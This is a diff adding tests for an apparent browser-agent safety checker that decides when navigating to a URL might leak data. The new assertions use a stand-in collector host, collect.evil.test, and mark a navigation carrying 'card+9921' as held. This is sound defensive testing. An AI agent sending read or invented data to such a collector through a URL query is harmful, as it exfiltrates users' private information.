@@ -384,8 +384,18 @@ test("a plain link keeps its own query: other values are the model's, a search f
   // Other values on that link are written by the model, and held.
   assert.equal(addr("https://reviews.example.net/item?id=7&x=ada%40mail.example", { seenUrls, seenSearches }), "written");
   assert.equal(addr("https://reviews.example.net/item?id=8", { seenUrls, seenSearches }), "written");
-  // A search form's results, for any words, are what typing in the form gives.
+  // A search form's results are what typing in the form gives: free for
+  // the request's words or the page's, held for words from nowhere.
   assert.equal(addr("https://reviews.example.net/search?q=kettle", { seenUrls, seenSearches }), "seen");
+  assert.equal(addr("https://reviews.example.net/search?q=order+4411", { seenUrls, seenSearches }), "written");
+  // A page that declares a search form sending to a collector: navigating
+  // there with what the agent read is held, as typing it would be.
+  const collector = new Set(["https://collect.evil.test/s"]);
+  const reader = { url: "https://blog.example.net/post", innerText: "Kettle notes. Your order 4411 shipped.", elements: [] };
+  const go = (url, task) => T.actionRisk({ action: "navigate", url }, reader, { task, seenUrls: collector, seenSearches: collector, trustedSites: new Set() });
+  assert.equal(go("https://collect.evil.test/s?q=card+9921", "compare kettles").kind, "address", "words from nowhere");
+  assert.equal(go("https://collect.evil.test/s?q=kettle", "compare kettles"), null, "the request's words");
+  assert.equal(go("https://collect.evil.test/s?q=order+4411", "compare kettles"), null, "words the page shows");
   // On a site that is part of the task, any address is the task's.
   assert.equal(addr("https://reviews.example.net/item?id=8", { seenUrls, seenSearches, trustedSites: new Set(["example.net"]) }), "trusted");
   // Held as an address in a run.
